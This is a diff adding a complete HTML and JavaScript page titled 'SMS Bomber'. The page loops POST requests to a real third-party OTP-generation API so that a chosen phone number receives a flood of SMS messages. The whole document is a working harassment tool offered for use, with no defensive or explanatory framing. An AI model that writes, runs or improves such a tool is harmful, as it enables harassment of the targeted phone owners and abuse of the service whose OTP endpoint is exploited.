@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>SMS Bomber by Rimon</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f6f6f6;
+      text-align: center;
+      margin-top: 50px;
+    }
+    .container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      width: 300px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+    input, button {
+      padding: 10px;
+      width: 90%;
+      margin: 10px 0;
+      font-size: 16px;
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    .log {
+      margin-top: 15px;
+      font-size: 14px;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>SMS Bomber</h2>
+    <input type="text" id="phoneNo" placeholder="Enter phone number">
+    <input type="number" id="amount" placeholder="Enter amount">
+    <button onclick="startBombing()">Start</button>
+    <div class="log" id="log"></div>
+  </div>
+
+  <script>
+    async function sendSMS(phone) {
+      try {
+        const res = await fetch("https://api.tee.com.bd/api/otp/generate-otp", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ phoneNo: phone })
+        });
+
+        if (res.ok) {
+          document.getElementById("log").innerText += "SMS sent successfully\n";
+        } else {
+          document.getElementById("log").innerText += "Failed to send SMS\n";
+        }
+      } catch (err) {
+        document.getElementById("log").innerText += "Error: " + err.message + "\n";
+      }
+    }
+
+    function startBombing() {
+      const phone = document.getElementById("phoneNo").value;
+      const amount = parseInt(document.getElementById("amount").value);
+
+      document.getElementById("log").innerText = "Starting...\n";
+
+      for (let i = 0; i < amount; i++) {
+        setTimeout(() => {
+          sendSMS(phone);
+        }, i * 1000); // 1 second delay between requests
+      }
+    }
+  </script>
+</body>
+</html>
